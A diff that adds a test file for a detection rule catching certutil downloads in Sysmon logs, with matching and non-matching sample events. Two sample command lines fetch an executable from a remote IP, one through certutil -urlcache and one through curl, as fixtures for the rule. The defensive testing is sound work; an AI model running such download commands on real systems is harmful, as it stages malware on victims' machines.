@@ -1,0 +1,62 @@
+rule: ../rules/certutil-download.yml
+normalizer: ../../example-normalizers/sysmon-normalizer.yaml
+
+cases:
+  - name: certutil urlcache download
+    expect: match
+    log:
+      EventID: 1
+      UtcTime: "2026-08-03 11:04:22.117"
+      Computer: WKSTN-014
+      User: CORP\jdoe
+      Image: C:\Windows\System32\certutil.exe
+      CommandLine: certutil.exe -urlcache -split -f http://198.51.100.20/a.exe a.exe
+      ParentImage: C:\Windows\System32\cmd.exe
+      ProcessGuid: "{a1b2c3d4-0001-0000-0000-000000000001}"
+
+  - name: certutil verifyctl download
+    expect: match
+    logFile: samples/certutil-verifyctl.json
+
+  - name: benign certutil encode
+    expect: no_match
+    log:
+      EventID: 1
+      UtcTime: "2026-08-03 11:06:01.004"
+      Computer: WKSTN-014
+      User: CORP\jdoe
+      Image: C:\Windows\System32\certutil.exe
+      CommandLine: certutil.exe -encode payload.bin payload.b64
+      ParentImage: C:\Windows\System32\cmd.exe
+
+  # The rule's logsource category becomes a bifract_category prefilter. A file write
+  # that merely mentions the command line must not trigger a process_creation rule.
+  - name: file write mentioning certutil does not trigger
+    expect: no_match
+    log:
+      EventID: 11
+      UtcTime: "2026-08-03 11:07:44.900"
+      Computer: WKSTN-014
+      Image: C:\Windows\System32\certutil.exe
+      TargetFilename: C:\Users\jdoe\AppData\Local\Temp\urlcache.tmp
+
+  - name: different signed binary downloading
+    expect: no_match
+    log:
+      EventID: 1
+      UtcTime: "2026-08-03 11:09:12.500"
+      Computer: WKSTN-014
+      Image: C:\Windows\System32\curl.exe
+      CommandLine: curl.exe -o a.exe http://198.51.100.20/a.exe
+
+  # Corpus assertions. `each: true` evaluates every log on its own, so this means
+  # "all four of these fire" rather than the default "at least one of them fires".
+  - name: every known true positive fires
+    expect: match
+    each: true
+    logFile: samples/certutil-true-positives.ndjson
+
+  - name: no benign certutil usage fires
+    expect: no_match
+    each: true
+    logFile: samples/certutil-benign.ndjson
